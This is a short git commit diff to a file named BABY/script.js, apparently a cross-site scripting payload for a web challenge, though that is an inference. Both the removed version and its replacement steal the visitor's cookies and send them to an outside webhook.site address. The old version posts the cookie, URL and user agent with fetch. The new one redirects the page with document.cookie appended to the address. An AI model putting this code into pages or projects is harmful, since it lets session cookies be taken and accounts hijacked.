6e7684c96580a905ce56079ca7b2f866ea99050e
NGUYỄN THÀNH ĐẠT <ntdat23121999@gmail.com>
2025-06-28 12:24:05 +0700

    Update script.js

--- BABY/script.js
+++ BABY/script.js
@@ -1,11 +1,1 @@
-try {
-    fetch('https://webhook.site/#!/view/7bed4386-411c-4def-94d4-c8615cd435f1', {
-        method: 'POST',
-        body: JSON.stringify({
-            cookie: document.cookie,
-            url: location.href,
-            userAgent: navigator.userAgent
-        }),
-        headers: { 'Content-Type': 'application/json' }
-    });
-} catch (e) {}
+document.location="https://webhook.site/#!/view/7bed4386-411c-4def-94d4-c8615cd435f1"+document.cookie
